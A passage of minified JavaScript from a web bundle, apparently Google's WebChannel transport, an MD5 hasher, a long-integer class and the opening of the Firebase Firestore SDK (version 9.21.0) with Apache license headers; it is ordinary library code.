M4(e,t){return!(ET(e.h)>=e.h.j-(e.m?1:0))&&(e.m?(e.i=t.F.concat(e.i),!0):!(1==e.H||2==e.H||e.C>=(e.cb?0:e.eb))&&(e.m=Du(nn(e.Na,e,t),LT(e,e.C)),e.C++,!0))}function Ow(e,t){var n;n=t?t.m:e.W++;const r=Hr(e.G);Je(r,"SID",e.J),Je(r,"RID",n),Je(r,"AID",e.V),bu(e,r),e.o&&e.s&&Wy(r,e.o,e.s),n=new Nu(e,e.j,n,e.C+1),null===e.o&&(n.I=e.s),t&&(e.i=t.F.concat(e.i)),t=bT(e,n,1e3),n.setTimeout(Math.round(.5*e.xa)+Math.round(.5*e.xa*Math.random())),jy(e.h,n),Ym(n,r,t)}function bu(e,t){e.ma&&Ay(e.ma,(function(e,n){Je(t,n,e)})),e.l&&mT({},(function(e,n){Je(t,n,e)}))}function bT(e,t,n){n=Math.min(e.i.length,n);var r=e.l?nn(e.l.Va,e.l,e):null;e:{var i=e.i;let t=-1;for(;;){const e=["count="+n];-1==t?0<n?(t=i[0].h,e.push("ofs="+t)):t=0:e.push("ofs="+t);let s=!0;for(let o=0;o<n;o++){let n=i[o].h;const a=i[o].g;if(n-=t,0>n)t=Math.max(0,i[o].h-100),s=!1;else try{x4(a,e,"req"+n+"_")}catch{r&&r(a)}}if(s){r=e.join("&");break e}}}return e=e.i.splice(0,n),t.F=e,r}function OT(e){e.g||e.u||(e.ba=1,eT(e.Ma,e),e.A=0)}function Hy(e){return!(e.g||e.u||3<=e.A)&&(e.ba++,e.u=Du(nn(e.Ma,e),LT(e,e.A)),e.A++,!0)}function Ky(e){null!=e.B&&(le.clearTimeout(e.B),e.B=null)}function PT(e){e.g=new Nu(e,e.j,"rpc",e.ba),null===e.o&&(e.g.I=e.s),e.g.O=0;var t=Hr(e.wa);Je(t,"RID","rpc"),Je(t,"SID",e.J),Je(t,"CI",e.M?"0":"1"),Je(t,"AID",e.V),Je(t,"TYPE","xmlhttp"),bu(e,t),e.o&&e.s&&Wy(t,e.o,e.s),e.K&&e.g.setTimeout(e.K);var n=e.g;e=e.oa,n.L=1,n.v=Vd(Hr(t)),n.s=null,n.S=!0,hT(n,e)}function qh(e){null!=e.v&&(le.clearTimeout(e.v),e.v=null)}function $T(e,t){var n=null;if(e.g==t){qh(e),Ky(e),e.g=null;var r=2}else{if(!Gm(e.h,t))return;n=t.F,TT(e.h,t),r=1}if(0!=e.H)if(e.ta=t.aa,t.i)if(1==r){n=t.s?t.s.length:0,t=Date.now()-t.G;var i=e.C;Gt(r=Pd(),new aT(r,n)),jd(e)}else OT(e);else if(3==(i=t.o)||0==i&&0<e.ta||!(1==r&&M4(e,t)||2==r&&Hy(e)))switch(n&&0<n.length&&(t=e.h,t.i=t.i.concat(n)),i){case 1:Is(e,5);break;case 4:Is(e,10);break;case 3:Is(e,6);break;default:Is(e,2)}}function LT(e,t){let n=e.ab+Math.floor(Math.random()*e.hb);return e.l||(n*=2),n*t}function Is(e,t){if(e.j.info("Error code "+t),2==t){var n=null;e.l&&(n=null);var r=nn(e.pb,e);n||(n=new Ms("//www.google.com/images/cleardot.gif"),le.location&&"http"==le.location.protocol||Bh(n,"https"),Vd(n)),I4(n.toString(),r)}else cn(2);e.H=0,e.l&&e.l.za(t),FT(e),AT(e)}function FT(e){if(e.H=0,e.pa=[],e.l){const t=xT(e.h);(0!=t.length||0!=e.i.length)&&(Tw(e.pa,t),Tw(e.pa,e.i),e.h.i.length=0,My(e.i),e.i.length=0),e.l.ya()}}function VT(e,t,n){var r=n instanceof Ms?Hr(n):new Ms(n,void 0);if(""!=r.g)t&&(r.g=t+"."+r.g),jh(r,r.m);else{var i=le.location;r=i.protocol,t=t?t+"."+i.hostname:i.hostname,i=+i.port;var s=new Ms(null,void 0);r&&Bh(s,r),t&&(s.g=t),i&&jh(s,i),n&&(s.l=n),r=s}return n=e.F,t=e.Da,n&&t&&Je(r,n,t),Je(r,"VER",e.qa),bu(e,r),r}function UT(e,t,n){if(t&&!e.I)throw Error("Can't create secondary domain capable XhrIo object.");return(t=n&&e.Ha&&!e.va?new ct(new Ru({ob:!0})):new ct(e.va)).Oa(e.I),t}function zT(){}function Yh(){if(ra&&!(10<=Number(GP)))throw Error("Environmental error: no available transport.")}function Rn(e,t){$t.call(this),this.g=new RT(t),this.l=e,this.h=t&&t.messageUrlParams||null,e=t&&t.messageHeaders||null,t&&t.clientProtocolHeaderRequired&&(e?e["X-Client-Protocol"]="webchannel":e={"X-Client-Protocol":"webchannel"}),this.g.s=e,e=t&&t.initMessageHeaders||null,t&&t.messageContentType&&(e?e["X-WebChannel-Content-Type"]=t.messageContentType:e={"X-WebChannel-Content-Type":t.messageContentType}),t&&t.Ca&&(e?e["X-WebChannel-Client-Profile"]=t.Ca:e={"X-WebChannel-Client-Profile":t.Ca}),this.g.U=e,(e=t&&t.cc)&&!Vh(e)&&(this.g.o=e),this.A=t&&t.supportsCrossDomainXhr||!1,this.v=t&&t.sendRawJson||!1,(t=t&&t.httpSessionIdParam)&&!Vh(t)&&(this.g.F=t,null!==(e=this.h)&&t in e&&(t in(e=this.h)&&delete e[t])),this.j=new Sa(this)}function BT(e){zy.call(this);var t=e.__sm__;if(t){e:{for(const n in t){e=n;break e}e=void 0}(this.i=e)&&(e=this.i,t=null!==t&&e in t?t[e]:void 0),this.data=t}else this.data=e}function jT(){By.call(this),this.status=1}function Sa(e){this.g=e}function R4(){this.blockSize=-1}function ir(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.m=Array(this.blockSize),this.i=this.h=0,this.reset()}function xp(e,t,n){n||(n=0);var r=Array(16);if("string"==typeof t)for(var i=0;16>i;++i)r[i]=t.charCodeAt(n++)|t.charCodeAt(n++)<<8|t.charCodeAt(n++)<<16|t.charCodeAt(n++)<<24;else for(i=0;16>i;++i)r[i]=t[n++]|t[n++]<<8|t[n++]<<16|t[n++]<<24;t=e.g[0],n=e.g[1],i=e.g[2];var s=e.g[3],o=t+(s^n&(i^s))+r[0]+3614090360&4294967295;o=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=(n=(i=(s=(t=n+(o<<7&4294967295|o>>>25))+((o=s+(i^t&(n^i))+r[1]+3905402710&4294967295)<<12&4294967295|o>>>20))+((o=i+(n^s&(t^n))+r[2]+606105819&4294967295)<<17&4294967295|o>>>15))+((o=n+(t^i&(s^t))+r[3]+3250441966&4294967295)<<22&4294967295|o>>>10))+((o=t+(s^n&(i^s))+r[4]+4118548399&4294967295)<<7&4294967295|o>>>25))+((o=s+(i^t&(n^i))+r[5]+1200080426&4294967295)<<12&4294967295|o>>>20))+((o=i+(n^s&(t^n))+r[6]+2821735955&4294967295)<<17&4294967295|o>>>15))+((o=n+(t^i&(s^t))+r[7]+4249261313&4294967295)<<22&4294967295|o>>>10))+((o=t+(s^n&(i^s))+r[8]+1770035416&4294967295)<<7&4294967295|o>>>25))+((o=s+(i^t&(n^i))+r[9]+2336552879&4294967295)<<12&4294967295|o>>>20))+((o=i+(n^s&(t^n))+r[10]+4294925233&4294967295)<<17&4294967295|o>>>15))+((o=n+(t^i&(s^t))+r[11]+2304563134&4294967295)<<22&4294967295|o>>>10))+((o=t+(s^n&(i^s))+r[12]+1804603682&4294967295)<<7&4294967295|o>>>25))+((o=s+(i^t&(n^i))+r[13]+4254626195&4294967295)<<12&4294967295|o>>>20))+((o=i+(n^s&(t^n))+r[14]+2792965006&4294967295)<<17&4294967295|o>>>15))+((o=n+(t^i&(s^t))+r[15]+1236535329&4294967295)<<22&4294967295|o>>>10))+((o=t+(i^s&(n^i))+r[1]+4129170786&4294967295)<<5&4294967295|o>>>27))+((o=s+(n^i&(t^n))+r[6]+3225465664&4294967295)<<9&4294967295|o>>>23))+((o=i+(t^n&(s^t))+r[11]+643717713&4294967295)<<14&4294967295|o>>>18))+((o=n+(s^t&(i^s))+r[0]+3921069994&4294967295)<<20&4294967295|o>>>12))+((o=t+(i^s&(n^i))+r[5]+3593408605&4294967295)<<5&4294967295|o>>>27))+((o=s+(n^i&(t^n))+r[10]+38016083&4294967295)<<9&4294967295|o>>>23))+((o=i+(t^n&(s^t))+r[15]+3634488961&4294967295)<<14&4294967295|o>>>18))+((o=n+(s^t&(i^s))+r[4]+3889429448&4294967295)<<20&4294967295|o>>>12))+((o=t+(i^s&(n^i))+r[9]+568446438&4294967295)<<5&4294967295|o>>>27))+((o=s+(n^i&(t^n))+r[14]+3275163606&4294967295)<<9&4294967295|o>>>23))+((o=i+(t^n&(s^t))+r[3]+4107603335&4294967295)<<14&4294967295|o>>>18))+((o=n+(s^t&(i^s))+r[8]+1163531501&4294967295)<<20&4294967295|o>>>12))+((o=t+(i^s&(n^i))+r[13]+2850285829&4294967295)<<5&4294967295|o>>>27))+((o=s+(n^i&(t^n))+r[2]+4243563512&4294967295)<<9&4294967295|o>>>23))+((o=i+(t^n&(s^t))+r[7]+1735328473&4294967295)<<14&4294967295|o>>>18))+((o=n+(s^t&(i^s))+r[12]+2368359562&4294967295)<<20&4294967295|o>>>12))+((o=t+(n^i^s)+r[5]+4294588738&4294967295)<<4&4294967295|o>>>28))+((o=s+(t^n^i)+r[8]+2272392833&4294967295)<<11&4294967295|o>>>21))+((o=i+(s^t^n)+r[11]+1839030562&4294967295)<<16&4294967295|o>>>16))+((o=n+(i^s^t)+r[14]+4259657740&4294967295)<<23&4294967295|o>>>9))+((o=t+(n^i^s)+r[1]+2763975236&4294967295)<<4&4294967295|o>>>28))+((o=s+(t^n^i)+r[4]+1272893353&4294967295)<<11&4294967295|o>>>21))+((o=i+(s^t^n)+r[7]+4139469664&4294967295)<<16&4294967295|o>>>16))+((o=n+(i^s^t)+r[10]+3200236656&4294967295)<<23&4294967295|o>>>9))+((o=t+(n^i^s)+r[13]+681279174&4294967295)<<4&4294967295|o>>>28))+((o=s+(t^n^i)+r[0]+3936430074&4294967295)<<11&4294967295|o>>>21))+((o=i+(s^t^n)+r[3]+3572445317&4294967295)<<16&4294967295|o>>>16))+((o=n+(i^s^t)+r[6]+76029189&4294967295)<<23&4294967295|o>>>9))+((o=t+(n^i^s)+r[9]+3654602809&4294967295)<<4&4294967295|o>>>28))+((o=s+(t^n^i)+r[12]+3873151461&4294967295)<<11&4294967295|o>>>21))+((o=i+(s^t^n)+r[15]+530742520&4294967295)<<16&4294967295|o>>>16))+((o=n+(i^s^t)+r[2]+3299628645&4294967295)<<23&4294967295|o>>>9))+((o=t+(i^(n|~s))+r[0]+4096336452&4294967295)<<6&4294967295|o>>>26))+((o=s+(n^(t|~i))+r[7]+1126891415&4294967295)<<10&4294967295|o>>>22))+((o=i+(t^(s|~n))+r[14]+2878612391&4294967295)<<15&4294967295|o>>>17))+((o=n+(s^(i|~t))+r[5]+4237533241&4294967295)<<21&4294967295|o>>>11))+((o=t+(i^(n|~s))+r[12]+1700485571&4294967295)<<6&4294967295|o>>>26))+((o=s+(n^(t|~i))+r[3]+2399980690&4294967295)<<10&4294967295|o>>>22))+((o=i+(t^(s|~n))+r[10]+4293915773&4294967295)<<15&4294967295|o>>>17))+((o=n+(s^(i|~t))+r[1]+2240044497&4294967295)<<21&4294967295|o>>>11))+((o=t+(i^(n|~s))+r[8]+1873313359&4294967295)<<6&4294967295|o>>>26))+((o=s+(n^(t|~i))+r[15]+4264355552&4294967295)<<10&4294967295|o>>>22))+((o=i+(t^(s|~n))+r[6]+2734768916&4294967295)<<15&4294967295|o>>>17))+((o=n+(s^(i|~t))+r[13]+1309151649&4294967295)<<21&4294967295|o>>>11))+((s=(t=n+((o=t+(i^(n|~s))+r[4]+4149444226&4294967295)<<6&4294967295|o>>>26))+((o=s+(n^(t|~i))+r[11]+3174756917&4294967295)<<10&4294967295|o>>>22))^((i=s+((o=i+(t^(s|~n))+r[2]+718787259&4294967295)<<15&4294967295|o>>>17))|~t))+r[9]+3951481745&4294967295,e.g[0]=e.g[0]+t&4294967295,e.g[1]=e.g[1]+(i+(o<<21&4294967295|o>>>11))&4294967295,e.g[2]=e.g[2]+i&4294967295,e.g[3]=e.g[3]+s&4294967295}function Oe(e,t){this.h=t;for(var n=[],r=!0,i=e.length-1;0<=i;i--){var s=0|e[i];r&&s==t||(n[i]=s,r=!1)}this.g=n}(W=ct.prototype).Oa=function(e){this.M=e},W.ha=function(e,t,n,r){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.I+"; newUri="+e);t=t?t.toUpperCase():"GET",this.I=e,this.j="",this.m=0,this.F=!1,this.h=!0,this.g=this.u?this.u.g():jm.g(),this.C=this.u?Nw(this.u):Nw(jm),this.g.onreadystatechange=nn(this.La,this);try{this.G=!0,this.g.open(t,String(e),!0),this.G=!1}catch(e){return void Aw(this,e)}if(e=n||"",n=new Map(this.headers),r)if(Object.getPrototypeOf(r)===Object.prototype)for(var i in r)n.set(i,r[i]);else{if("function"!=typeof r.keys||"function"!=typeof r.get)throw Error("Unknown input type for opt_headers: "+String(r));for(const e of r.keys())n.set(e,r.get(e))}r=Array.from(n.keys()).find((e=>"content-type"==e.toLowerCase())),i=le.FormData&&e instanceof le.FormData,!(0<=z2(C4,t))||r||i||n.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[e,t]of n)this.g.setRequestHeader(e,t);this.K&&(this.g.responseType=this.K),"withCredentials"in this.g&&this.g.withCredentials!==this.M&&(this.g.withCredentials=this.M);try{NT(this),0<this.B&&((this.L=N4(this.g))?(this.g.timeout=this.B,this.g.ontimeout=nn(this.ua,this)):this.A=Vy(this.ua,this.B,this)),this.v=!0,this.g.send(e),this.v=!1}catch(e){Aw(this,e)}},W.ua=function(){typeof Ny<"u"&&this.g&&(this.j="Timed out after "+this.B+"ms, aborting",this.m=8,Gt(this,"timeout"),this.abort(8))},W.abort=function(e){this.g&&this.h&&(this.h=!1,this.l=!0,this.g.abort(),this.l=!1,this.m=e||7,Gt(this,"complete"),Gt(this,"abort"),zd(this))},W.N=function(){this.g&&(this.h&&(this.h=!1,this.l=!0,this.g.abort(),this.l=!1),zd(this,!0)),ct.$.N.call(this)},W.La=function(){this.s||(this.G||this.v||this.l?CT(this):this.kb())},W.kb=function(){CT(this)},W.da=function(){try{return 2<Lr(this)?this.g.status:-1}catch{return-1}},W.ja=function(){try{return this.g?this.g.responseText:""}catch{return""}},W.Wa=function(e){if(this.g){var t=this.g.responseText;return e&&0==t.indexOf(e)&&(t=t.substring(e.length)),k4(t)}},W.Ia=function(){return this.m},W.Sa=function(){return"string"==typeof this.j?this.j:String(this.j)},(W=RT.prototype).qa=8,W.H=1,W.Na=function(e){if(this.m)if(this.m=null,1==this.H){if(!e){this.W=Math.floor(1e5*Math.random()),e=this.W++;const i=new Nu(this,this.j,e,void 0);let s=this.s;if(this.U&&(s?(s=W2(s),G2(s,this.U)):s=this.U),null!==this.o||this.O||(i.I=s,s=null),this.P)e:{for(var t=0,n=0;n<this.i.length;n++){var r=this.i[n];if(void 0===(r="__data__"in r.g&&"string"==typeof(r=r.g.__data__)?r.length:void 0))break;if(4096<(t+=r)){t=n;break e}if(4096===t||n===this.i.length-1){t=n+1;break e}}t=1e3}else t=1e3;t=bT(this,i,t),Je(n=Hr(this.G),"RID",e),Je(n,"CVER",22),this.F&&Je(n,"X-HTTP-Session-Id",this.F),bu(this,n),s&&(this.O?t="headers="+encodeURIComponent(String(MT(s)))+"&"+t:this.o&&Wy(n,this.o,s)),jy(this.h,i),this.bb&&Je(n,"TYPE","init"),this.P?(Je(n,"$req",t),Je(n,"SID","null"),i.ba=!0,Ym(i,n,null)):Ym(i,n,t),this.H=2}}else 3==this.H&&(e?Ow(this,e):0==this.i.length||_T(this.h)||Ow(this))},W.Ma=function(){if(this.u=null,PT(this),this.ca&&!(this.L||null==this.g||0>=this.S)){var e=2*this.S;this.j.info("BP detection timer enabled: "+e),this.B=Du(nn(this.jb,this),e)}},W.jb=function(){this.B&&(this.B=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.M=!1,this.L=!0,cn(10),Bd(this),PT(this))},W.ib=function(){null!=this.v&&(this.v=null,Bd(this),Hy(this),cn(19))},W.pb=function(e){e?(this.j.info("Successfully pinged google.com"),cn(2)):(this.j.info("Failed to ping google.com"),cn(1))},(W=zT.prototype).Ba=function(){},W.Aa=function(){},W.za=function(){},W.ya=function(){},W.Va=function(){},Yh.prototype.g=function(e,t){return new Rn(e,t)},Lt(Rn,$t),Rn.prototype.m=function(){this.g.l=this.j,this.A&&(this.g.I=!0);var e=this.g,t=this.l,n=this.h||void 0;cn(0),e.Y=t,e.ma=n||{},e.M=e.aa,e.G=VT(e,null,e.Y),jd(e)},Rn.prototype.close=function(){Gy(this.g)},Rn.prototype.u=function(e){var t=this.g;if("string"==typeof e){var n={};n.__data__=e,e=n}else this.v&&((n={}).__data__=Ly(e),e=n);t.i.push(new _4(t.fb++,e)),3==t.H&&jd(t)},Rn.prototype.N=function(){this.g.l=null,delete this.j,Gy(this.g),delete this.g,Rn.$.N.call(this)},Lt(BT,zy),Lt(jT,By),Lt(Sa,zT),Sa.prototype.Ba=function(){Gt(this.g,"a")},Sa.prototype.Aa=function(e){Gt(this.g,new BT(e))},Sa.prototype.za=function(e){Gt(this.g,new jT)},Sa.prototype.ya=function(){Gt(this.g,"b")},Lt(ir,R4),ir.prototype.reset=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.i=this.h=0},ir.prototype.j=function(e,t){void 0===t&&(t=e.length);for(var n=t-this.blockSize,r=this.m,i=this.h,s=0;s<t;){if(0==i)for(;s<=n;)xp(this,e,s),s+=this.blockSize;if("string"==typeof e){for(;s<t;)if(r[i++]=e.charCodeAt(s++),i==this.blockSize){xp(this,r),i=0;break}}else for(;s<t;)if(r[i++]=e[s++],i==this.blockSize){xp(this,r),i=0;break}}this.h=i,this.i+=t},ir.prototype.l=function(){var e=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);e[0]=128;for(var t=1;t<e.length-8;++t)e[t]=0;var n=8*this.i;for(t=e.length-8;t<e.length;++t)e[t]=255&n,n/=256;for(this.j(e),e=Array(16),t=n=0;4>t;++t)for(var r=0;32>r;r+=8)e[n++]=this.g[t]>>>r&255;return e};var A4={};function Qy(e){return-128<=e&&128>e?B2(A4,e,(function(e){return new Oe([0|e],0>e?-1:0)})):new Oe([0|e],0>e?-1:0)}function fr(e){if(isNaN(e)||!isFinite(e))return qo;if(0>e)return qt(fr(-e));for(var t=[],n=1,r=0;e>=n;r++)t[r]=e/n|0,n*=Hm;return new Oe(t,0)}function qT(e,t){if(0==e.length)throw Error("number format error: empty string");if(2>(t=t||10)||36<t)throw Error("radix out of range: "+t);if("-"==e.charAt(0))return qt(qT(e.substring(1),t));if(0<=e.indexOf("-"))throw Error('number format error: interior "-" character');for(var n=fr(Math.pow(t,8)),r=qo,i=0;i<e.length;i+=8){var s=Math.min(8,e.length-i),o=parseInt(e.substring(i,i+s),t);8>s?(s=fr(Math.pow(t,s)),r=r.R(s).add(fr(o))):r=(r=r.R(n)).add(fr(o))}return r}var Hm=4294967296,qo=Qy(0),Km=Qy(1),Pw=Qy(16777216);function Fr(e){if(0!=e.h)return!1;for(var t=0;t<e.g.length;t++)if(0!=e.g[t])return!1;return!0}function Un(e){return-1==e.h}function qt(e){for(var t=e.g.length,n=[],r=0;r<t;r++)n[r]=~e.g[r];return new Oe(n,~e.h).add(Km)}function Wh(e,t){return e.add(qt(t))}function Nc(e,t){for(;(65535&e[t])!=e[t];)e[t+1]+=e[t]>>>16,e[t]&=65535,t++}function Qa(e,t){this.g=e,this.h=t}function Gh(e,t){if(Fr(t))throw Error("division by zero");if(Fr(e))return new Qa(qo,qo);if(Un(e))return t=Gh(qt(e),t),new Qa(qt(t.g),qt(t.h));if(Un(t))return t=Gh(e,qt(t)),new Qa(qt(t.g),t.h);if(30<e.g.length){if(Un(e)||Un(t))throw Error("slowDivide_ only works with positive integers.");for(var n=Km,r=t;0>=r.X(e);)n=$w(n),r=$w(r);var i=go(n,1),s=go(r,1);for(r=go(r,2),n=go(n,2);!Fr(r);){var o=s.add(r);0>=o.X(e)&&(i=i.add(n),s=o),r=go(r,1),n=go(n,1)}return t=Wh(e,i.R(t)),new Qa(i,t)}for(i=qo;0<=e.X(t);){for(n=Math.max(1,Math.floor(e.ea()/t.ea())),r=48>=(r=Math.ceil(Math.log(n)/Math.LN2))?1:Math.pow(2,r-48),o=(s=fr(n)).R(t);Un(o)||0<o.X(e);)o=(s=fr(n-=r)).R(t);Fr(s)&&(s=Km),i=i.add(s),e=Wh(e,o)}return new Qa(i,e)}function $w(e){for(var t=e.g.length+1,n=[],r=0;r<t;r++)n[r]=e.D(r)<<1|e.D(r-1)>>>31;return new Oe(n,e.h)}function go(e,t){var n=t>>5;t%=32;for(var r=e.g.length-n,i=[],s=0;s<r;s++)i[s]=0<t?e.D(s+n)>>>t|e.D(s+n+1)<<32-t:e.D(s+n);return new Oe(i,e.h)}(W=Oe.prototype).ea=function(){if(Un(this))return-qt(this).ea();for(var e=0,t=1,n=0;n<this.g.length;n++){var r=this.D(n);e+=(0<=r?r:Hm+r)*t,t*=Hm}return e},W.toString=function(e){if(2>(e=e||10)||36<e)throw Error("radix out of range: "+e);if(Fr(this))return"0";if(Un(this))return"-"+qt(this).toString(e);for(var t=fr(Math.pow(e,6)),n=this,r="";;){var i=Gh(n,t).g,s=((0<(n=Wh(n,i.R(t))).g.length?n.g[0]:n.h)>>>0).toString(e);if(Fr(n=i))return s+r;for(;6>s.length;)s="0"+s;r=s+r}},W.D=function(e){return 0>e?0:e<this.g.length?this.g[e]:this.h},W.X=function(e){return Un(e=Wh(this,e))?-1:Fr(e)?0:1},W.abs=function(){return Un(this)?qt(this):this},W.add=function(e){for(var t=Math.max(this.g.length,e.g.length),n=[],r=0,i=0;i<=t;i++){var s=r+(65535&this.D(i))+(65535&e.D(i)),o=(s>>>16)+(this.D(i)>>>16)+(e.D(i)>>>16);r=o>>>16,s&=65535,o&=65535,n[i]=o<<16|s}return new Oe(n,-2147483648&n[n.length-1]?-1:0)},W.R=function(e){if(Fr(this)||Fr(e))return qo;if(Un(this))return Un(e)?qt(this).R(qt(e)):qt(qt(this).R(e));if(Un(e))return qt(this.R(qt(e)));if(0>this.X(Pw)&&0>e.X(Pw))return fr(this.ea()*e.ea());for(var t=this.g.length+e.g.length,n=[],r=0;r<2*t;r++)n[r]=0;for(r=0;r<this.g.length;r++)for(var i=0;i<e.g.length;i++){var s=this.D(r)>>>16,o=65535&this.D(r),a=e.D(i)>>>16,l=65535&e.D(i);n[2*r+2*i]+=o*l,Nc(n,2*r+2*i),n[2*r+2*i+1]+=s*l,Nc(n,2*r+2*i+1),n[2*r+2*i+1]+=o*a,Nc(n,2*r+2*i+1),n[2*r+2*i+2]+=s*a,Nc(n,2*r+2*i+2)}for(r=0;r<t;r++)n[r]=n[2*r+1]<<16|n[2*r];for(r=t;r<2*t;r++)n[r]=0;return new Oe(n,0)},W.gb=function(e){return Gh(this,e).h},W.and=function(e){for(var t=Math.max(this.g.length,e.g.length),n=[],r=0;r<t;r++)n[r]=this.D(r)&e.D(r);return new Oe(n,this.h&e.h)},W.or=function(e){for(var t=Math.max(this.g.length,e.g.length),n=[],r=0;r<t;r++)n[r]=this.D(r)|e.D(r);return new Oe(n,this.h|e.h)},W.xor=function(e){for(var t=Math.max(this.g.length,e.g.length),n=[],r=0;r<t;r++)n[r]=this.D(r)^e.D(r);return new Oe(n,this.h^e.h)},Yh.prototype.createWebChannel=Yh.prototype.g,Rn.prototype.send=Rn.prototype.u,Rn.prototype.open=Rn.prototype.m,Rn.prototype.close=Rn.prototype.close,$d.NO_ERROR=0,$d.TIMEOUT=8,$d.HTTP_ERROR=6,lT.COMPLETE="complete",uT.EventType=Cu,Cu.OPEN="a",Cu.CLOSE="b",Cu.ERROR="c",Cu.MESSAGE="d",$t.prototype.listen=$t.prototype.O,ct.prototype.listenOnce=ct.prototype.P,ct.prototype.getLastError=ct.prototype.Sa,ct.prototype.getLastErrorCode=ct.prototype.Ia,ct.prototype.getStatus=ct.prototype.da,ct.prototype.getResponseJson=ct.prototype.Wa,ct.prototype.getResponseText=ct.prototype.ja,ct.prototype.send=ct.prototype.ha,ct.prototype.setWithCredentials=ct.prototype.Oa,ir.prototype.digest=ir.prototype.l,ir.prototype.reset=ir.prototype.reset,ir.prototype.update=ir.prototype.j,Oe.prototype.add=Oe.prototype.add,Oe.prototype.multiply=Oe.prototype.R,Oe.prototype.modulo=Oe.prototype.gb,Oe.prototype.compare=Oe.prototype.X,Oe.prototype.toNumber=Oe.prototype.ea,Oe.prototype.toString=Oe.prototype.toString,Oe.prototype.getBits=Oe.prototype.D,Oe.fromNumber=fr,Oe.fromString=qT;var b4=function(){return new Yh},O4=function(){return Pd()},Ip=$d,P4=lT,$4=Zs,Lw={xb:0,Ab:1,Bb:2,Ub:3,Zb:4,Wb:5,Xb:6,Vb:7,Tb:8,Yb:9,PROXY:10,NOPROXY:11,Rb:12,Nb:13,Ob:14,Mb:15,Pb:16,Qb:17,tb:18,sb:19,ub:20},L4=Ru,Mc=uT,F4=ct,V4=ir,Yo=Oe;const Fw="@firebase/firestore";
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bt{constructor(e){this.uid=e}isAuthenticated(){return null!=this.uid}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}bt.UNAUTHENTICATED=new bt(null),bt.GOOGLE_CREDENTIALS=new bt("google-credentials-uid"),bt.FIRST_PARTY=new bt("first-party-uid"),bt.MOCK_USER=new bt("mock-user");
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let _a="9.21.0";
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $i=new xy("@firebase/firestore");function Qm(){return $i.logLevel}function U4(e){$i.setLogLevel(e)}function V(e,...t){if($i.logLevel<=Ce.DEBUG){const n=t.map(Xy);$i.debug(`Firestore (${_a}): ${e}`,...n)}}function mt(e,...t){if($i.logLevel<=Ce.ERROR){const n=t.map(Xy);$i.error(`Firestore (${_a}): ${e}`,...n)}}function sr(e,...t){if($i.logLevel<=Ce.WARN){const n=t.map(Xy);$i.warn(`Firestore (${_a}): ${e}`,...n)}}function Xy(e){if("string"==typeof e)return e;try{return t=e,JSON.stringify(t)}catch{return e}
/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/var t}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function G(e="Unexpected state"){const t=`FIRESTORE (${_a}) INTERNAL ASSERTION FAILED: `+e;throw mt(t),new Error(t)}function te(e,t){e||G()}function z4(e,t){e||G()}function q(e,t){return e}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
